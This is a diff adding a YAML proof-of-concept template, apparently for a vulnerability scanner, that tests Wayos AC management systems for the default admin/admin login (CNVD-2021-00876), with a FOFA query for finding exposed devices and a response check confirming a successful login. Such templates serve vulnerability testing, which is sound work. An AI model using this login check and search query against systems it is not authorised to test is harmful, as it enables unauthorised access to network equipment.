@@ -1,0 +1,24 @@
+id: poc-yaml-wayos-ac-weak-pass
+info:
+  name: Wayos AC集中管理系统默认弱口令 CNVD-2021-00876
+  severity: high
+  tags:
+  - 弱口令
+  - CNVD-2021-00876
+  finger: Wayos AC集中管理系统
+  fofa: title="AC集中管理平台" && body="login_25.jpg"
+requests:
+- method: POST
+  path: /login.cgi
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: user=admin&password=admin
+  expression: 'status_code == 200 && !contains(body, "login.html?flag=0")
+
+    && contains(headers, "ac_userid=admin")
+
+    && contains(body, "window.open(''index.htm")
+
+    '
+variables: {}
+transport: http
